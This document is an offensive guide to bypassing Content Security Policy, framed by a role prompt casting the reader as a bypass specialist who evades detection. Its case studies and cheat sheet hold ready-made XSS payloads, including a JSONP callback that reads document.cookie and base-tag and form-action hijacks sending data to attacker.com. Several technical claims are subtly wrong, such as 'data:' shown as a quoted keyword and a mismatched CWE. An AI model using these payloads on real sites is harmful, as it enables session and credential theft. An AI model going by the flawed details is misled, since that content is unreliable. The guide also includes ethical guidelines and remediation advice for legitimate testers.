# Content Security Policy (CSP) Bypass - Complete Hunting Guide

## Expert Role Definition and Mission Statement

You are a CSP bypass specialist with deep expertise in circumventing Content Security Policy protections. Your mission is to identify CSP misconfigurations, bypass restrictions, and exploit weaknesses to achieve XSS or data exfiltration. You understand the intricate details of CSP directives, source expressions, and the subtle vulnerabilities that arise from improper implementation. You possess mastery over tools like CSP Auditor, CSP Evaluator, and custom bypass scripts. Your goal is to chain CSP bypasses with other attack vectors to achieve maximum impact, from reflected XSS to full account compromise. You approach every target with methodical precision, analyzing CSP headers, identifying weaknesses, and crafting bypasses that evade detection while maintaining effectiveness.

## Core Concepts Deep Dive

### CSP Fundamentals

Content Security Policy is an HTTP header that restricts which resources a browser can load. It's designed to mitigate XSS, data injection, and clickjacking attacks.

**CSP Header Format:**
```
Content-Security-Policy: <directive> <source-list>; ... 
Content-Security-Policy-Report-Only: <directive> <source-list>; report-uri /csp-report
```

### CSP Directives

**Document Directives:**
- `base-uri` - Restricts URLs for `<base>` tag
- `default-src` - Fallback for other directives
- `sandbox` - Restricts document features
- `script-src` - Controls JavaScript sources
- `style-src` - Controls stylesheet sources

**Fetch Directives:**
- `connect-src` - Controls fetch/XHR/WebSocket
- `font-src` - Controls font sources
- `frame-src` - Controls iframe sources
- `img-src` - Controls image sources
- `media-src` - Controls media sources
- `object-src` - Controls plugin sources
- `prefetch-src` - Controls prefetch sources

**Navigation Directives:**
- `form-action` - Controls form submission targets
- `frame-ancestors` - Controls who can embed the page
- `navigate-to` - Controls navigation targets

**Reporting Directives:**
- `report-uri` - Endpoint for violation reports
- `report-to` - Reporting endpoint (newer)
- `require-sri-for` - Require Subresource Integrity

### CSP Source Expressions

```
'none'              - No sources allowed
'self'              - Same origin
'data:'             - Data URIs
'blob:'             - Blob URIs
'https:'            - HTTPS anywhere
'http:'             - HTTP anywhere
*.example.com       - Any subdomain of example.com
example.com         - Exact domain
example.com:443     - Specific port
example.com/path    - Specific path
'sha256-...'        - Specific script hash
'nonce-...'         - Random nonce per request
```

### CSP Bypass Taxonomy

1. **Source Bypass** - Finding allowed sources for injection
2. **Directive Bypass** - Exploiting missing/weak directives
3. **Script Gadgets** - Using existing scripts for injection
4. **JSONP/Angular Bypass** - Exploiting allowed JSONP endpoints
5. **Base-uri Bypass** - Hijacking base tag
6. **Form-action Bypass** - Redirecting form submissions
7. **Frame-ancestors Bypass** - Clickjacking with CSP
8. **Event Handler Bypass** - Inline event handlers
9. **Angular/Vue Bypass** - Framework-specific bypasses
10. **Mutation XSS** - DOM mutation attacks

## Pre-requisite Knowledge

- Understanding of XSS attack vectors
- Knowledge of HTML, CSS, and JavaScript
- Familiarity with browser security model
- Understanding of HTTP headers and cookies
- Knowledge of web application architecture
- Familiarity with common web frameworks
- Understanding of encoding techniques

## Step-by-Step Hunting Methodology

### Phase 1: CSP Discovery and Analysis

**Step 1: Identify CSP Headers**
```bash
# Using curl
curl -I https://target.com | grep -i "content-security-policy"

# Using Burp Suite
# Check response headers

# Using browser DevTools
# Network tab → Response Headers
```

**Step 2: Decode and Analyze CSP**
```python
#!/usr/bin/env python3
import re

def parse_csp(csp_header):
    """Parse CSP header into directives"""
    directives = {}
    parts = csp_header.split(';')
    
    for part in parts:
        part = part.strip()
        if ' ' in part:
            directive, sources = part.split(' ', 1)
            directives[directive] = sources.split()
    
    return directives

# Example usage
csp = "default-src 'self'; script-src 'self' https://trusted.com; style-src 'self' 'unsafe-inline'"
print(parse_csp(csp))
```

**Step 3: Identify Weaknesses**
```
Check for:
- 'unsafe-inline' in script-src
- 'unsafe-eval' in script-src
- data: in img-src, script-src
- *.domain.com (wildcard subdomains)
- Missing directives
- Report-only mode
- Overly broad sources
```

### Phase 2: Bypass Testing

**Test 1: JSONP Bypass**
```bash
# If script-src allows a domain with JSONP
# Try: https://allowed.com/jsonp?callback=alert(1)//
curl "https://allowed.com/jsonp?callback=alert(1)//"
```

**Test 2: Angular CSP Bypass**
```bash
# If script-src allows angular.js
# Try: https://angular.com/angular.min.js
curl "https://angular.com/angular.min.js"
# Payload: {{constructor.constructor('alert(1)')()}}
```

**Test 3: Base-uri Bypass**
```bash
# If base-uri is not restricted
<base href="https://attacker.com/">
# All relative URLs now point to attacker
```

**Test 4: Form-action Bypass**
```bash
# If form-action is not restricted
<form action="https://attacker.com/steal">
  <input type="hidden" name="token" value="...">
  <button type="submit">Submit</button>
</form>
```

**Test 5: Event Handler Bypass**
```bash
# If event handlers are not blocked
<img src=x onerror="alert(1)">
<svg onload="alert(1)">
<body onload="alert(1)">
```

### Phase 3: Exploitation Chain

```
1. Analyze CSP header thoroughly
2. Identify all allowed sources
3. Test each source for injection points
4. Test for missing directives
5. Chain with other vulnerabilities
6. Document all bypasses
```

## Tool Arsenal with Exact Commands

### CSP Auditor

```bash
# Installation
git clone https://github.com/nicothin/CSP-auditor
cd CSP-auditor

# Basic scan
python3 csp_auditor.py -u https://target.com

# With custom headers
python3 csp_auditor.py -u https://target.com -H "Authorization: Bearer token"

# Output to file
python3 csp_auditor.py -u https://target.com -o results.txt
```

### CSP Evaluator (Google)

```bash
# Online tool
# https://csp-evaluator.withgoogle.com/

# API usage
curl -X POST https://csp-evaluator.withgoogle.com/api/analyze \
  -H "Content-Type: application/json" \
  -d '{"csp": "default-src self; script-src self"}'
```

### Custom CSP Bypass Script

```python
#!/usr/bin/env python3
import requests
import re
from urllib.parse import urlparse

class CSPBypass:
    def __init__(self, target_url):
        self.target_url = target_url
        self.csp_header = None
        self.directives = {}
    
    def get_csp(self):
        """Fetch and parse CSP header"""
        response = requests.get(self.target_url)
        self.csp_header = response.headers.get('Content-Security-Policy', '')
        self.parse_csp()
        return self.csp_header
    
    def parse_csp(self):
        """Parse CSP into directives"""
        if not self.csp_header:
            return
        
        parts = self.csp_header.split(';')
        for part in parts:
            part = part.strip()
            if ' ' in part:
                directive, sources = part.split(' ', 1)
                self.directives[directive] = sources.split()
    
    def check_unsafe_inline(self):
        """Check for unsafe-inline in script-src"""
        if 'script-src' in self.directives:
            return "'unsafe-inline'" in self.directives['script-src']
        return False
    
    def check_unsafe_eval(self):
        """Check for unsafe-eval in script-src"""
        if 'script-src' in self.directives:
            return "'unsafe-eval'" in self.directives['script-src']
        return False
    
    def check_data_uri(self):
        """Check for data: URI in various directives"""
        results = {}
        for directive in ['script-src', 'img-src', 'font-src', 'style-src']:
            if directive in self.directives:
                results[directive] = 'data:' in self.directives[directive]
        return results
    
    def check_wildcard_domains(self):
        """Check for wildcard domain usage"""
        wildcard_domains = []
        for directive, sources in self.directives.items():
            for source in sources:
                if source.startswith('*.'):
                    wildcard_domains.append((directive, source))
        return wildcard_domains
    
    def check_jsonp_endpoints(self):
        """Check for JSONP endpoints in allowed domains"""
        jsonp_endpoints = []
        for directive in ['script-src', 'default-src']:
            if directive in self.directives:
                for source in self.directives[directive]:
                    if source.startswith('http') or source.startswith('https'):
                        jsonp_endpoints.append(source)
        return jsonp_endpoints
    
    def test_jsonp_bypass(self, domain):
        """Test JSONP bypass on a domain"""
        jsonp_urls = [
            f"{domain}/?callback=alert(1)//",
            f"{domain}/?jsonp=alert(1)//",
            f"{domain}/?cb=alert(1)//",
            f"{domain}/?callback=alert(1)//",
        ]
        
        for url in jsonp_urls:
            try:
                response = requests.get(url, timeout=5)
                if 'alert' in response.text or 'callback' in response.text:
                    return {"url": url, "status": "potential_bypass"}
            except:
                continue
        
        return {"status": "no_bypass_found"}
    
    def generate_bypass_payloads(self):
        """Generate CSP bypass payloads based on analysis"""
        payloads = []
        
        # Check for unsafe-inline
        if self.check_unsafe_inline():
            payloads.append("<script>alert(1)</script>")
            payloads.append("<img src=x onerror='alert(1)'>")
        
        # Check for unsafe-eval
        if self.check_unsafe_eval():
            payloads.append("<script>alert(1)</script>")
            payloads.append("<img src=x onerror='alert(1)'>")
        
        # Check for data URI
        data_uri = self.check_data_uri()
        if data_uri.get('script-src'):
            payloads.append("<script src='data:text/javascript,alert(1)'></script>")
        
        # Check for wildcard domains
        wildcards = self.check_wildcard_domains()
        for directive, domain in wildcards:
            payloads.append(f"// Inject via {directive}: {domain}")
        
        return payloads
    
    def full_scan(self):
        """Perform full CSP bypass scan"""
        print(f"[*] Scanning: {self.target_url}")
        
        # Get CSP
        csp = self.get_csp()
        if not csp:
            print("[!] No CSP header found")
            return
        
        print(f"[*] CSP: {csp}")
        
        # Analyze
        print(f"\n[*] Analysis:")
        print(f"  Unsafe-inline: {self.check_unsafe_inline()}")
        print(f"  Unsafe-eval: {self.check_unsafe_eval()}")
        print(f"  Data URI: {self.check_data_uri()}")
        print(f"  Wildcard domains: {self.check_wildcard_domains()}")
        
        # Test JSONP
        print(f"\n[*] Testing JSONP bypass:")
        jsonp_domains = self.check_jsonp_endpoints()
        for domain in jsonp_domains:
            result = self.test_jsonp_bypass(domain)
            print(f"  {domain}: {result}")
        
        # Generate payloads
        print(f"\n[*] Bypass payloads:")
        payloads = self.generate_bypass_payloads()
        for payload in payloads:
            print(f"  {payload}")

# Usage
bypass = CSPBypass("https://target.com")
bypass.full_scan()
```

### Burp Suite Extensions

```
# CSP Auditor
- Install from BApp Store
- Analyze CSP headers
- Identify bypass opportunities

# Headless Browser
- Test CSP in context
- Execute bypass payloads
```

## Real-World Case Studies

### Case Study 1: JSONP Bypass to XSS

**Scenario:** Application has CSP with `script-src 'self' https://api.example.com`

**Discovery:**
```bash
# Step 1: Analyze CSP
curl -I https://target.com | grep Content-Security-Policy
# Response: script-src 'self' https://api.example.com

# Step 2: Check for JSONP on allowed domain
curl "https://api.example.com/?callback=test"
# Response: test({"data": "value"})

# Step 3: Test JSONP bypass
curl "https://api.example.com/?callback=alert(1)//"
# Response: alert(1)({"data": "value"})
# XSS achieved!
```

**Exploitation:**
```html
<!-- Inject this payload -->
<script src="https://api.example.com/?callback=alert(document.cookie)//"></script>
```

### Case Study 2: Angular CSP Bypass

**Scenario:** Application has CSP with `script-src 'self' https://angular.com`

**Discovery:**
```bash
# Step 1: Analyze CSP
curl -I https://target.com | grep Content-Security-Policy
# Response: script-src 'self' https://angular.com

# Step 2: Check Angular version
curl "https://angular.com/angular.min.js"
# Angular 1.x detected

# Step 3: Test Angular CSP bypass
curl "https://angular.com/angular.min.js"
# Angular 1.x allows CSP bypass via template expressions
```

**Exploitation:**
```html
<!-- Inject Angular template -->
<div ng-app>{{constructor.constructor('alert(1)')()}}</div>

<!-- Or via URL -->
https://target.com/page?param={{constructor.constructor('alert(1)')()}}
```

### Case Study 3: Base-uri Bypass

**Scenario:** CSP doesn't restrict `base-uri`

**Discovery:**
```bash
# Step 1: Analyze CSP
curl -I https://target.com | grep Content-Security-Policy
# Response: default-src 'self'; script-src 'self'
# Note: No base-uri directive

# Step 2: Test base tag injection
curl "https://target.com/page?param=<base href='https://attacker.com/'>"
```

**Exploitation:**
```html
<!-- Inject base tag -->
<base href="https://attacker.com/">

<!-- Now all relative URLs point to attacker -->
<img src="logo.png"> <!-- Loads from attacker.com/logo.png -->
<script src="app.js"></script> <!-- Loads from attacker.com/app.js -->
```

### Case Study 4: Form-action Bypass

**Scenario:** CSP doesn't restrict `form-action`

**Discovery:**
```bash
# Step 1: Analyze CSP
curl -I https://target.com | grep Content-Security-Policy
# Response: default-src 'self'; script-src 'self'
# Note: No form-action directive

# Step 2: Test form redirect
curl "https://target.com/page?param=<form action='https://attacker.com/steal'><input name='token' value=''><button>Submit</button></form>"
```

**Exploitation:**
```html
<!-- Inject form -->
<form action="https://attacker.com/steal" method="POST">
  <input type="hidden" name="cookies" value="">
  <input type="hidden" name="tokens" value="">
  <button type="submit">Click here</button>
</form>
```

## Advanced Techniques and Bypass

### Script Gadgets

**Using Existing Scripts:**
```javascript
// If jQuery is allowed and has vulnerable version
// Use jQuery's $.globalEval or similar

// Example with jQuery
$.getScript("https://attacker.com/malicious.js")

// Or using existing script patterns
window.eval(document.querySelector('script[type="application/json"]').textContent)
```

### Mutation XSS

**DOM Mutation Attacks:**
```html
<!-- Payload that mutates DOM -->
<svg onload="alert(1)">
<!-- CSP may block SVG but not the event handler -->

<!-- Or using DOMParser -->
<script>
var parser = new DOMParser();
var doc = parser.parseFromString('<img src=x onerror=alert(1)>', 'text/html');
document.body.appendChild(doc.body);
</script>
```

### CSP via HTTP only

**Bypassing CSP via HTTP:**
```bash
# If CSP is only on HTTPS
curl http://target.com
# May not have CSP header

# Or if CSP is only on certain paths
curl https://target.com/api
# May not have CSP header
```

### Report-Only Bypass

**Testing Report-Only Mode:**
```bash
# If CSP is report-only
curl -I https://target.com | grep Content-Security-Policy-Report-Only
# CSP is not enforced, only reported

# Exploit freely
<script>alert(1)</script>
# Works! CSP only logs violations
```

## Detection and Indicators

### CSP Violation Reports

```json
{
  "csp-report": {
    "document-uri": "https://target.com/page",
    "referrer": "",
    "blocked-uri": "https://attacker.com/malicious.js",
    "violated-directive": "script-src 'self'",
    "effective-directive": "script-src",
    "original-policy": "script-src 'self'",
    "disposition": "enforce",
    "status-code": 200,
    "script-sample": ""
  }
}
```

### Browser Console Errors

```
Refused to load the script 'https://attacker.com/malicious.js' because it violates the following Content Security Policy directive: "script-src 'self'"
```

### Server Log Indicators

```
[CSP] Violation from https://target.com: blocked https://attacker.com/malicious.js
[CSP] Script-src violation: https://attacker.com/malicious.js
```

## Impact Assessment

| Impact Level | Description | Example |
|-------------|-------------|---------|
| Critical | Full XSS with data exfiltration | JSONP bypass to cookie theft |
| High | XSS with limited scope | Event handler bypass |
| Medium | Clickjacking via frame-ancestors | Missing frame-ancestors |
| Low | Information disclosure | CSP report leakage |

## Common Pitfalls

1. **Not testing all directives** - Each directive has specific bypasses
2. **Ignoring report-only mode** - CSP not enforced
3. **Overlooking wildcard domains** - *.example.com allows many subdomains
4. **Not checking for JSONP** - Common bypass vector
5. **Forgetting Angular/Vue** - Framework-specific bypasses
6. **Ignoring base-uri** - Can redirect all relative URLs
7. **Not testing form-action** - Can redirect form submissions
8. **Overlooking event handlers** - onerror, onload, etc.
9. **Ignoring data URIs** - Can inject scripts via data:
10. **Not chaining with other vulns** - CSP bypass + XSS + CSRF

## Integration with Other Hunting Areas

- **XSS**: CSP bypass enables XSS
- **Clickjacking**: frame-ancestors bypass
- **CSRF**: CSP can prevent/enable CSRF
- **Data Exfiltration**: CSP bypass allows data theft
- **Session Hijacking**: XSS via CSP bypass
- **Phishing**: CSP bypass can enable phishing
- **Malware Delivery**: CSP bypass can load malicious scripts

## Reporting Template

```
## Vulnerability: CSP Bypass to XSS

### Summary
[One sentence description]

### CSP Header
[Full CSP header]

### Bypass Technique
- Type: [JSONP/Angular/Base-uri/etc]
- Source: [allowed domain]
- Payload: [exact payload]

### Proof of Concept
[Step-by-step reproduction]

### Impact
[Detailed impact analysis]

### Remediation
- Remove unnecessary sources
- Avoid 'unsafe-inline' and 'unsafe-eval'
- Restrict base-uri and form-action
- Use nonces or hashes for scripts
- Implement report-uri for monitoring

### References
- CWE-1021: Improper Restriction of Rendered UI Layers
- OWASP: Content Security Policy Cheat Sheet
- https://csp.withgoogle.com
```

## Practice Labs

### CSP Bypass Labs

**PortSwigger CSP Labs:**
- https://portswigger.net/web-security/csp
- Free hands-on labs

**CSP Bypass Challenge:**
```bash
# Set up test environment
git clone https://github.com/nicothin/CSP-bypass-challenges
cd CSP-bypass-challenges
docker-compose up
```

**DVWS (Damn Vulnerable Web Server):**
```bash
git clone https://github.com/pschlink/DVWS
# CSP bypass challenges included
```

### Practice Commands

```bash
# Test CSP bypass
curl -I https://target.com | grep -i content-security-policy

# Test JSONP bypass
curl "https://allowed-domain.com/?callback=alert(1)//"

# Test Angular bypass
curl "https://angular.com/angular.min.js"

# Generate CSP report
curl -X POST https://target.com/csp-report \
  -H "Content-Type: application/json" \
  -d '{"csp-report": {"document-uri": "https://target.com", "violated-directive": "script-src"}}'
```

## Ethical Guidelines

1. **Only test systems you have permission to test**
2. **Do not exfiltrate data without authorization**
3. **Report all findings to the system owner**
4. **Do not cause damage to systems**
5. **Use test accounts for testing when possible**
6. **Document all actions for audit purposes**
7. **Follow responsible disclosure practices**
8. **Do not share exploits publicly**
9. **Comply with all applicable laws and regulations**
10. **Leave systems in the state you found them**

## Quick Reference Cheat Sheet

### CSP Testing Checklist

```
[ ] Identify CSP header
[ ] Parse all directives
[ ] Check for unsafe-inline
[ ] Check for unsafe-eval
[ ] Check for data URIs
[ ] Check for wildcard domains
[ ] Test JSONP endpoints
[ ] Test Angular/Vue bypass
[ ] Test base-uri
[ ] Test form-action
[ ] Test event handlers
[ ] Chain with XSS
[ ] Document all findings
```

### Common Bypass Payloads

**JSONP Bypass:**
```html
<script src="https://allowed.com/?callback=alert(1)//"></script>
```

**Angular Bypass:**
```html
<div ng-app>{{constructor.constructor('alert(1)')()}}</div>
```

**Base-uri Bypass:**
```html
<base href="https://attacker.com/">
```

**Event Handler Bypass:**
```html
<img src=x onerror="alert(1)">
<svg onload="alert(1)">
```

### Quick Commands

```bash
# Get CSP header
curl -I https://target.com | grep -i content-security-policy

# Test JSONP
curl "https://allowed.com/?callback=alert(1)//"

# Test Angular
curl "https://angular.com/angular.min.js"

# Decode CSP
echo "default-src 'self'" | tr ';' '\n'
```

### CSP Best Practices

```
1. Use default-src 'none'
2. Specify exact domains (no wildcards)
3. Avoid 'unsafe-inline' and 'unsafe-eval'
4. Use nonces or hashes for scripts
5. Restrict base-uri and form-action
6. Use report-uri for monitoring
7. Test CSP thoroughly before deployment
8. Monitor CSP violation reports
9. Update CSP as application changes
10. Use CSP in report-only mode first
```
